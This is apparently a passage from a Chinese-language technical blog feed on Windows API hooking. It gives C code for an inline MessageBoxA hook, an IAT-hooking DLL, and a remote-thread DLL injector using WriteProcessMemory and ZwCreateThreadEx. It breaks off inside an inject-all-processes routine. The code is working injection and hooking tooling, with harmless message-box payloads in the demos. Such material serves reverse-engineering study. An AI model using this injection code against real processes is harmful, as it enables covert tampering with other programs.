<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD jump = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">_declspec(naked) <span class="type">int</span> _stdcall <span class="title function_">Transfer</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span> &#123;</span><br><span class="line">	_asm &#123;</span><br><span class="line">		mov edi, edi</span><br><span class="line">		push ebp</span><br><span class="line">		mov ebp, esp</span><br><span class="line">		mov ebx, jump</span><br><span class="line">		jmp ebx</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BYTE olddata32[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">hook</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">MyMessageBoxA</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span> &#123;</span><br><span class="line">	</span><br><span class="line">	num++;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;MessageBox被调用%d次\n&quot;</span>, num);</span><br><span class="line">	<span class="type">char</span>* text = <span class="string">&quot;Hook&quot;</span>; </span><br><span class="line">	</span><br><span class="line">	hook();<span class="comment">//函数中之前再次hok 为了拦截下次调用</span></span><br><span class="line">	<span class="keyword">return</span> Transfer( hWnd,  text, text,  uType);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//挂钩</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">hook</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">//获取MessageBox的地址</span></span><br><span class="line">	DWORD messagebox = (DWORD)GetProcAddress(GetModuleHandle(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line"></span><br><span class="line">	DWORD value = (DWORD)MyMessageBoxA - messagebox - <span class="number">5</span>; <span class="comment">//计算jmp跳转的偏移量</span></span><br><span class="line"></span><br><span class="line">	DWORD oldProtected = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//将内存改为可读可写可执行</span></span><br><span class="line">	VirtualProtect(messagebox, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtected);</span><br><span class="line">	</span><br><span class="line">	jump = messagebox + <span class="number">5</span>;  <span class="comment">//+5 越过jmp指令  | mov edi edi| push ebp | mov ebp, esp</span></span><br><span class="line">	_asm &#123;</span><br><span class="line">		mov eax,messagebox</span><br><span class="line">		mov byte ptr [eax], <span class="number">0xe9</span>    <span class="comment">//jmp</span></span><br><span class="line">		inc eax </span><br><span class="line">		<span class="comment">//后面还有4个字节 用一个寄存器存储</span></span><br><span class="line">		mov ebx, value </span><br><span class="line">		mov dword ptr [eax], ebx</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//还原内存属性</span></span><br><span class="line">	VirtualProtect(messagebox, <span class="number">5</span>, oldProtected, &amp;oldProtected);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	hook();</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)	&#123;</span><br><span class="line">		MessageBoxA(<span class="number">0</span>, <span class="string">&quot;正常调用MessageBoxA&quot;</span>, <span class="string">&quot;未Hook&quot;</span>, <span class="number">0</span>);</span><br><span class="line">		Sleep(<span class="number">2000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>R3Hook</category>
      </categories>
      <tags>
        <tag>R3Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>IATHook</title>
    <url>/posts/60466c61/</url>
    <content><![CDATA[<p>IATHook 即修改PE文件的输入表，将目标函数修改成我们自己的函数并执行(这里使用MessageBoxA)。<br>可用来HOOK自身的LoadLibrary函数防止自身进程被dll注入，也可以通过dll注入的方式达到修改其他进程的目的</p>
<p>ITAdll.dll</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(WINAPI* lPMessageBoxA)</span><span class="params">(HWND, LPCSTR , LPCSTR, UINT)</span>;</span><br><span class="line">lPMessageBoxA 原来的MessageBox = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">MyMessageBoxA</span><span class="params">(HWND hWnd, LPCSTR lpText,  LPCSTR lpCaption, UINT uType)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> 原来的MessageBox(hWnd, <span class="string">&quot;textgai&quot;</span>, lpCaption, uType);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_NT_HEADERS <span class="title function_">GetNthead</span><span class="params">()</span> &#123;</span><br><span class="line">    PIMAGE_DOS_HEADER dos = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS nt = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    DWORD temp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    HMODULE 镜像基地址 = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">    dos = (PIMAGE_DOS_HEADER)(DWORD)镜像基地址;</span><br><span class="line">    temp = (DWORD)dos + (DWORD)dos-&gt;e_lfanew;   <span class="comment">//pe rva</span></span><br><span class="line">    nt = (PIMAGE_NT_HEADERS)temp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> nt;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">IATHook</span><span class="params">()</span> &#123;</span><br><span class="line">    原来的MessageBox = (lPMessageBoxA)GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    <span class="comment">//获取ntheader</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNtHead = GetNthead();</span><br><span class="line">    <span class="comment">//获取FileHeader</span></span><br><span class="line">    PIMAGE_FILE_HEADER pFileHead = &amp;pNtHead-&gt;FileHeader;</span><br><span class="line">    <span class="comment">//获取OptionalHeader</span></span><br><span class="line">    PIMAGE_OPTIONAL_HEADER pOpHead = &amp;pNtHead-&gt;OptionalHeader;</span><br><span class="line"></span><br><span class="line">    HMODULE hmod = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">    DWORD 基地址 = (DWORD)hmod;</span><br><span class="line">    <span class="comment">//获取导出表RVA偏移</span></span><br><span class="line">    DWORD RVA = pOpHead-&gt;DataDirectory[<span class="number">1</span>].VirtualAddress;</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR 导入表 = (PIMAGE_IMPORT_DESCRIPTOR)(基地址 + RVA);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (导入表-&gt;FirstThunk) <span class="comment">//导入表-&gt;FirstThunk 导入表偏移</span></span><br><span class="line">    &#123;</span><br><span class="line">        PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(基地址 + 导入表-&gt;FirstThunk);</span><br><span class="line">        <span class="keyword">while</span> (pThunk-&gt;u1.Function)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (pThunk-&gt;u1.Function == (DWORD)原来的MessageBox) <span class="comment">//找到IAT导入地址表中的MessageBoxA</span></span><br><span class="line">            &#123;</span><br><span class="line">                DWORD oldProtected;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//将内存改为可写可读可执行</span></span><br><span class="line">                VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtected);  <span class="comment">//4 32位下地址都为4个字节</span></span><br><span class="line">                pThunk-&gt;u1.Function = (DWORD)MyMessageBoxA; <span class="comment">//修改IAT值</span></span><br><span class="line">                VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, <span class="number">4</span>, oldProtected, &amp;oldProtected);  </span><br><span class="line">            &#125;</span><br><span class="line">            pThunk++;</span><br><span class="line">        &#125;</span><br><span class="line">        导入表++;    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        IATHook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winbase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* MyZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">	SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">	SIZE_T StackSize,</span></span><br><span class="line"><span class="params">	SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* MyZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	BOOL CreateSuspended,</span></span><br><span class="line"><span class="params">	DWORD dwStackSize,</span></span><br><span class="line"><span class="params">	DWORD dw1,</span></span><br><span class="line"><span class="params">	DWORD dw2,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">InjectDll</span><span class="params">(DWORD dwPID, <span class="type">char</span>* szDllPath)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE	hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;</span><br><span class="line">	LPVOID	pRemoteBuf;</span><br><span class="line">	DWORD	dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</span><br><span class="line">	LPTHREAD_START_ROUTINE  pThreadProc;</span><br><span class="line">	<span class="comment">//1.使用dwPID获取目标进程句柄</span></span><br><span class="line">	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenProcess(%d) failed!!!\n&quot;</span>, dwPID);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;OpenProcess(%d) SUCCESS!!!\n&quot;</span>, dwPID);</span><br><span class="line">	<span class="comment">//2.在目标进程内存中分配szdllname大小的内存</span></span><br><span class="line">	pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="comment">//3.在dll路径写入分配的内存 </span></span><br><span class="line">	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//4.获取LoadLibrary API的地址</span></span><br><span class="line">	HMODULE ntdll = LoadLibraryA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	MyZwCreateThreadEx ZwCreateThreadEx = (MyZwCreateThreadEx)GetProcAddress(ntdll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="comment">//5.在目标进程中运行线程</span></span><br><span class="line">	ZwCreateThreadEx(&amp;hThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(%d)进程创建远线程失败 ！！！\n&quot;</span>, dwPID);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	WaitForSingleObject(hThread, <span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	FreeLibrary(ntdll);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//if (argc != 2)</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	printf(&quot;请输入pid&quot;);</span></span><br><span class="line">	<span class="comment">//	return;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line">	<span class="comment">//int pid = atol(argv[1]);</span></span><br><span class="line">	InjectDll(<span class="number">12656</span>, <span class="string">&quot;C:\\Users\\test\\Desktop\\IATDll.dll&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>注入工具</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winbase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* MyZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">	SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">	SIZE_T StackSize,</span></span><br><span class="line"><span class="params">	SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* MyZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	BOOL CreateSuspended,</span></span><br><span class="line"><span class="params">	DWORD dwStackSize,</span></span><br><span class="line"><span class="params">	DWORD dw1,</span></span><br><span class="line"><span class="params">	DWORD dw2,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span><span class="params">(*SetPid)</span><span class="params">(DWORD)</span>;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> INJECTION_MODE = <span class="number">0</span>, EJECTION_MODE &#125;;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span></span><br><span class="line">&#123;</span><br><span class="line">	TOKEN_PRIVILEGES tp;</span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	LUID luid;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,</span><br><span class="line">		&amp;hToken))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenProcessToken error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>,            <span class="comment">// lookup privilege on local system</span></span><br><span class="line">		lpszPrivilege,   <span class="comment">// privilege to lookup </span></span><br><span class="line">		&amp;luid))        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;LookupPrivilegeValue error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">	tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">	<span class="keyword">if</span> (bEnablePrivilege)</span><br><span class="line">		tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">	<span class="keyword">if</span> (!AdjustTokenPrivileges(hToken,</span><br><span class="line">		FALSE,</span><br><span class="line">		&amp;tp,</span><br><span class="line">		<span class="keyword">sizeof</span>(TOKEN_PRIVILEGES),</span><br><span class="line">		(PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,</span><br><span class="line">		(PDWORD)<span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (GetLastError() == ERROR_NOT_ALL_ASSIGNED)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE	hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;</span><br><span class="line">	LPVOID	pRemoteBuf;</span><br><span class="line">	DWORD	dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</span><br><span class="line">	LPTHREAD_START_ROUTINE  pThreadProc;</span><br><span class="line">	<span class="comment">//1.使用dwPID获取目标进程句柄</span></span><br><span class="line">	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenProcess(%d) failed!!!\n&quot;</span>, dwPID);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;OpenProcess(%d) SUCCESS!!!\n&quot;</span>, dwPID);</span><br><span class="line">	<span class="comment">//2.在目标进程内存中分配szdllname大小的内存</span></span><br><span class="line">	pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="comment">//3.在dll路径写入分配的内存 </span></span><br><span class="line">	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//4.获取LoadLibrary API的地址</span></span><br><span class="line">	HMODULE ntdll = LoadLibraryA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	MyZwCreateThreadEx ZwCreateThreadEx = (MyZwCreateThreadEx)GetProcAddress(ntdll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>),<span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="comment">//5.在目标进程中运行线程</span></span><br><span class="line">	ZwCreateThreadEx(&amp;hThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(%d)进程创建远线程失败 ！！！\n&quot;</span>, dwPID);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	WaitForSingleObject(hThread, <span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	FreeLibrary(ntdll);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">EjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span><br><span class="line">&#123;</span><br><span class="line">	BOOL	bMore = FALSE, bFound = FALSE;</span><br><span class="line">	HANDLE	hSnapshot, hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;</span><br><span class="line">	MODULEENTRY32	me = &#123; <span class="keyword">sizeof</span>(me) &#125;;</span><br><span class="line">	LPTHREAD_START_ROUTINE  pThreadProc;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (INVALID_HANDLE_VALUE == (hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)))</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	bMore = Module32First(hSnapshot, &amp;me);</span><br><span class="line">	LPCSTR p = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">for</span> (; bMore; bMore = Module32Next(hSnapshot, &amp;me))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!_tcsicmp(me.szModule, szDllPath) ||</span><br><span class="line">			!_tcsicmp(me.szExePath, szDllPath))</span><br><span class="line">		&#123;</span><br><span class="line">			bFound = TRUE;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!bFound)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseHandle(hSnapshot);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))</span><br><span class="line">	&#123;</span><br><span class="line">		CloseHandle(hSnapshot);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>),<span class="string">&quot;FreeLibrary&quot;</span>);</span><br><span class="line"></span><br><span class="line">	HMODULE ntdll = LoadLibraryA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	MyZwCreateThreadEx ZwCreateThreadEx = (MyZwCreateThreadEx)GetProcAddress(ntdll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line"></span><br><span class="line">	ZwCreateThreadEx(&amp;hThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess,</span><br><span class="line">		pThreadProc, me.modBaseAddr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(%d)进程创建远线程失败 ！！！\n&quot;</span>, dwPID);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;(%d)卸载DLL完成 ！！！\n&quot;</span>, dwPID);</span><br><span class="line"></span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	CloseHandle(hSnapshot);</span><br><span class="line">	FreeLibrary(ntdll);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">InjectAllProcess</span><span class="params">(<span class="type">int</span> nMode, LPCTSTR szDllPath)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD	dwPID = <span class="number">0</span>;</span><br><span class="line">	HANDLE	hSnapShot = 